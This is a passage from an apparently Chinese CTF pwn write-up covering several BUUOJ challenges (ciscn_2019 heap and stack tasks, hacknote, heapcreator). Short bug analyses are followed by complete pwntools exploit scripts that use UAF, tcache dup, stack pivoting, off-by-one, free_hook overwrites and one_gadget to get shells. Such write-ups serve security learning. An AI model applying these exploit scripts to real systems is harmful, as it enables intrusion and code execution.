class="hljs-string">"Secret"</span>,str(answer[i]))sla(<span class="hljs-string">"Secret"</span>,<span class="hljs-string">'1'</span>)itr()</code></pre></div><h2 id="ciscn-2019-es-1"><a href="#ciscn-2019-es-1" class="headerlink" title="ciscn_2019_es_1"></a><code>ciscn_2019_es_1</code></h2><h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><p>64位，ubuntu 18.  存在 UAF，十分简单的tcache dup攻击。</p><h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ciscn_2019_es_1'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29639</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,name,call)</span>:</span>    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'name'</span>,str(name))    sa(<span class="hljs-string">'call'</span>,str(call))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">call</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))add(<span class="hljs-number">0x500</span>,<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'chumen77'</span>) <span class="hljs-comment">#0</span>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'chumen77'</span>) <span class="hljs-comment">#1</span><span class="hljs-comment"># debug()</span>call(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)ru(<span class="hljs-string">'name:\n'</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ebca0</span>info_addr(<span class="hljs-string">'libc'</span>,libc_base)<span class="hljs-comment">#get libc</span>add(<span class="hljs-number">0x510</span><span class="hljs-number">-0x20</span><span class="hljs-number">-0x10</span>,<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'chumen77'</span>) <span class="hljs-comment">#2</span>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'chumen77'</span>) <span class="hljs-comment">#3</span>call(<span class="hljs-number">3</span>)call(<span class="hljs-number">3</span>)free_hook = libc_base + <span class="hljs-number">0x3ed8e8</span>add(<span class="hljs-number">0x20</span>,p64(free_hook),p64(free_hook)) <span class="hljs-comment">#4</span>add(<span class="hljs-number">0x20</span>,p64(free_hook),p64(free_hook)) <span class="hljs-comment">#5</span>rec = rce18[<span class="hljs-number">1</span>] + libc_baseadd(<span class="hljs-number">0x20</span>,p64(rec),p64(rec))call(<span class="hljs-number">1</span>)itr()</code></pre></div><h2 id="ciscn-2019-s-4"><a href="#ciscn-2019-s-4" class="headerlink" title="ciscn_2019_s_4"></a><code>ciscn_2019_s_4</code></h2><h3 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vul</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+0h] [ebp-28h]</span>  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>u);  read(<span class="hljs-number">0</span>, &amp;s, <span class="hljs-number">0x30</span>u);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Hello, %s\n"</span>, &amp;s);  read(<span class="hljs-number">0</span>, &amp;s, <span class="hljs-number">0x30</span>u);  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Hello, %s\n"</span>, &amp;s);&#125;</code></pre></div><ul><li>存在栈溢出，溢出8个字节，考虑栈转移。</li><li>在填充buf， <code>%s</code> 在32位用于泄漏栈上的信息。</li></ul><p>所以可以考虑泄漏处栈地址，libc地址。从而算出buf的base与libc base。</p><p>首先可以明确一点可以覆盖返回地址，第一下考虑直接覆盖为<code>one_gadget</code> 本地通远程不通。</p><p>然后就考虑用栈转移到buf上来获取shell。</p><h3 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ciscn_s_4'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26932</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()payload = <span class="hljs-string">'a'</span> * (<span class="hljs-number">0x28</span> - <span class="hljs-number">1</span> ) + <span class="hljs-string">'b'</span>sa(<span class="hljs-string">'name'</span>,payload)ru(<span class="hljs-string">"b"</span>)buf_base = uu32(r(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x38</span>r(<span class="hljs-number">4</span>)libc_base = uu32(r(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x1fb9b0</span>info_addr(<span class="hljs-string">'stack'</span>,buf_base)info_addr(<span class="hljs-string">'libc'</span>,libc_base)payload = p32(<span class="hljs-number">0x8048450</span>) + p32(elf.plt[<span class="hljs-string">'system'</span>]) + p32(<span class="hljs-number">0x8048450</span>) + p32(buf_base+<span class="hljs-number">16</span>) + <span class="hljs-string">'/bin/sh\x00'</span>payload = payload.ljust((<span class="hljs-number">0x30</span><span class="hljs-number">-4</span><span class="hljs-number">-4</span><span class="hljs-number">-8</span>),<span class="hljs-string">'b'</span>) + p32(buf_base) *<span class="hljs-number">3</span>+ p32(<span class="hljs-number">0x80485FD</span>)s(payload)itr()</code></pre></div><h2 id="ciscn-2019-final-2"><a href="#ciscn-2019-final-2" class="headerlink" title="ciscn_2019_final_2"></a><code>ciscn_2019_final_2</code></h2><h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><p>程序很简单，但是也很细节，由于自己的逆向能力有点差，没有注意部分细节，造成构造堆块，进行leak和改写时，造成较大的困难和迷惑。</p><p>开启了沙盒不能get shell：</p><div class="hljs"><pre><code class="hljs undefined">#  line  CODE  JT   JF      K# =================================#  <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch#  <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x05</span> <span class="hljs-number">0xc000003e</span>  <span class="hljs-keyword">if</span> (A != ARCH_X86_64) goto <span class="hljs-number">0007</span>#  <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number#  <span class="hljs-number">0003</span>: <span class="hljs-number">0x35</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x40000000</span>  <span class="hljs-keyword">if</span> (A &lt; <span class="hljs-number">0x40000000</span>) goto <span class="hljs-number">0005</span>#  <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0xffffffff</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0xffffffff</span>) goto <span class="hljs-number">0007</span>#  <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000003b</span>  <span class="hljs-keyword">if</span> (A == execve) goto <span class="hljs-number">0007</span>#  <span class="hljs-number">0006</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW#  <span class="hljs-number">0007</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">return</span> KILL</code></pre></div><h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><ul><li>UAF</li></ul><p>比如：</p><h4 id="程序处："><a href="#程序处：" class="headerlink" title="程序处："></a>程序处：</h4><h5 id="add函数："><a href="#add函数：" class="headerlink" title="add函数："></a>add函数：</h5><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> *v0; <span class="hljs-comment">// rbx</span>__int16 v1; <span class="hljs-comment">// ax</span></code></pre></div><div class="hljs"><pre><code class="hljs c">v0 = (<span class="hljs-keyword">int</span> *)int_pt;*v0 = get_atoi();*((_DWORD *)int_pt + <span class="hljs-number">2</span>) = *(_DWORD *)int_pt;</code></pre></div><div class="hljs"><pre><code class="hljs c">v1 = get_atoi();*(_WORD *)short_pt = v1;*((_WORD *)short_pt + <span class="hljs-number">4</span>) = *(_WORD *)short_pt;</code></pre></div><p>开始对数据类型的大小没有注意，这几处决定着</p><ul><li>int型堆块时，只能写上4字节的数据</li><li>short int 型堆块时，只能写上2字节的数据</li></ul><h5 id="show函数："><a href="#show函数：" class="headerlink" title="show函数："></a>show函数：</h5><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">1</span> &amp;&amp; int_pt )    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"your int type inode number :%d\n"</span>, *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)int_pt);  <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">2</span> &amp;&amp; short_pt )    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"your short type inode number :%d\n"</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)*(<span class="hljs-keyword">signed</span> __int16 *)short_pt);</code></pre></div><p>意味着leak时也是只能泄漏出部分的字节，增加在利用时的难度，需要利用合适的堆块进行攻击，其合适是指上面有残留合适的数据，然后改末尾几个字节。</p><h4 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h4><p>scanf函数是从stdin中读取数据，且在<code>__IO_2_stdio_</code> 的io结构体存在一个<code>_fileno</code>的标识位，默认值是0，若将其改成其他的文件号，调用scanf函数在获取时，就会获取对应文件。</p><h4 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h4><ul><li>程序只让你分配0x30或者0x20的堆块，如何伪造出一个至少0x90的堆块，如何释放后，来泄漏libc。</li><li>泄漏出来的数据不是完整的，可写时只能写上2、4字节</li></ul><h3 id="exp-14"><a href="#exp-14" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ciscn_final_2'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25252</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(type,number)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'&gt;'</span>,str(type))    sla(<span class="hljs-string">":"</span>,str(number))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(type)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'&gt;'</span>,str(type))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(type)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'&gt;'</span>,str(type))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leave</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'4'</span>)    <span class="hljs-comment"># sa('?',str(mes))</span>add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)free(<span class="hljs-number">1</span>) <span class="hljs-comment">#leave chunk 0 </span>add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>) <span class="hljs-comment"># 0x90</span><span class="hljs-comment">#ready to dup</span>add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)free(<span class="hljs-number">2</span>)add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-comment"># get chunk0</span>free(<span class="hljs-number">2</span>)<span class="hljs-comment">#leak heap</span>show(<span class="hljs-number">2</span>)ru(<span class="hljs-string">'number :'</span>)chunk0_addr_word = int(ru(<span class="hljs-string">'\n'</span>)) - <span class="hljs-number">0xa0</span>info_addr(<span class="hljs-string">'chunk0_addr'</span>,chunk0_addr_word)add(<span class="hljs-number">2</span>,chunk0_addr_word)add(<span class="hljs-number">2</span>,chunk0_addr_word)add(<span class="hljs-number">2</span>,<span class="hljs-number">0x91</span>) <span class="hljs-comment">#fake unsortbin chunk</span><span class="hljs-comment">#full tache bins</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free(<span class="hljs-number">1</span>)    add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<span class="hljs-comment">#leak libc</span>free(<span class="hljs-number">1</span>)show(<span class="hljs-number">1</span>)ru(<span class="hljs-string">'number :'</span>)stdin_fillno = int(ru(<span class="hljs-string">'\n'</span>)) - <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x70</span>info_addr(<span class="hljs-string">'stdin_fillno'</span>,stdin_fillno)<span class="hljs-comment">#ready to attack stdin_fillno ,use taeche dup</span>add(<span class="hljs-number">1</span>,stdin_fillno)add(<span class="hljs-number">1</span>,stdin_fillno)free(<span class="hljs-number">1</span>)add(<span class="hljs-number">2</span>,stdin_fillno)free(<span class="hljs-number">1</span>)<span class="hljs-comment">#leak contains libc's heap</span>show(<span class="hljs-number">1</span>)ru(<span class="hljs-string">'number :'</span>)chunk1_addr_dword = int(ru(<span class="hljs-string">'\n'</span>)) - <span class="hljs-number">0x30</span>info_addr(<span class="hljs-string">'chunk1_addr_dword'</span>,chunk1_addr_dword)<span class="hljs-comment">#change the 0x30bins chains</span>add(<span class="hljs-number">1</span>,chunk1_addr_dword)add(<span class="hljs-number">1</span>,chunk1_addr_dword)add(<span class="hljs-number">1</span>,stdin_fillno)<span class="hljs-comment">#attck the fileno</span>add(<span class="hljs-number">1</span>,<span class="hljs-number">666</span>)leave()itr()</code></pre></div><p>渣渣英文注释，先不改了。感觉还是挺不容易做的题，堆块如何构造想了老久。到别的师傅那里，归类为简单题。太菜了太菜了，基础还不是很好。</p><h2 id="pwnable-hacknote"><a href="#pwnable-hacknote" class="headerlink" title="pwnable_hacknote"></a><code>pwnable_hacknote</code></h2><h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h3><p>简单的uaf</p><h4 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h4><div class="hljs"><pre><code class="hljs c">(*(<span class="hljs-keyword">void</span> (__cdecl **)(<span class="hljs-keyword">void</span> *))ptr[v1])(ptr[v1]);</code></pre></div><p>此处在改完<code>ptr[v1]</code>为system以后，其参数的指针是从这个堆块开始的要提前进行截断。</p><div class="hljs"><pre><code class="hljs c">system(p32(system) + '||sh')system(p32(system) + ';sh;')</code></pre></div><h3 id="exp-15"><a href="#exp-15" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./hacknote'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27225</span>)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'Content'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'bbbb'</span>)add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'bbbb'</span>)free(<span class="hljs-number">0</span>)free(<span class="hljs-number">1</span>)add(<span class="hljs-number">8</span>,p32(<span class="hljs-number">0x0804862B</span>) + p32(elf.got[<span class="hljs-string">'__libc_start_main'</span>]))show(<span class="hljs-number">0</span>)r()libc_base = uu32(r(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x18540</span>info_addr(<span class="hljs-string">'base'</span>,libc_base)free(<span class="hljs-number">2</span>)system = <span class="hljs-number">0x0003ada0</span> + libc_baseadd(<span class="hljs-number">8</span>,p32(system) + <span class="hljs-string">'||sh'</span>)show(<span class="hljs-number">0</span>)itr()</code></pre></div><p>Buu远程打不通。。</p><h2 id="hitcontraining-heapcreator"><a href="#hitcontraining-heapcreator" class="headerlink" title="hitcontraining_heapcreator"></a><code>hitcontraining_heapcreator</code></h2><h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h3><p>Edit函数处，故意可以多写出一个字节。</p><ul><li>off by one</li></ul><h3 id="exp-16"><a href="#exp-16" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./heapcreator'</span>context.log_level = <span class="hljs-string">'debug'</span>elf = ELF(local_file)debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26646</span>)    libc = elf.libc    <span class="hljs-comment"># remote_libc = '.' # './libc.so.6'</span>    <span class="hljs-comment"># libc = ELF(remote_libc)</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'Heap'</span>,str(size))    sa(<span class="hljs-string">'heap'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sa(<span class="hljs-string">'heap'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))add(<span class="hljs-number">0x18</span>,<span class="hljs-string">'\x00'</span>)add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'bbbb'</span>)add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'cccc'</span>)add(<span class="hljs-number">0x10</span>,<span class="hljs-string">'dddd'</span>)payload = <span class="hljs-number">0x18</span> * <span class="hljs-string">'a'</span> + <span class="hljs-string">'\xa1'</span>edit(<span class="hljs-number">0</span>,payload)free(<span class="hljs-number">1</span>)add(<span class="hljs-number">0x10</span>,<span class="hljs-string">'\x78'</span>)show(<span class="hljs-number">1</span>)ru(<span class="hljs-string">'Content : '</span>)base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b78</span>info_addr(<span class="hljs-string">'libc_base'</span>,base)free(<span class="hljs-number">1</span>)free_hook = <span class="hljs-number">0x3c67a8</span> + basepaylaod = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">2</span> * <span class="hljs-number">8</span>  + p64(<span class="hljs-number">8</span>) + p64(free_hook)add(<span class="hljs-number">0x30</span>,paylaod)rce = base + rce16[<span class="hljs-number">1</span>]edit(<span class="hljs-number">2</span>,p64(rce))free(<span class="hljs-number">0</span>)itr()</code></pre></div><h2 id="0ctf-2017-babyheap"><a 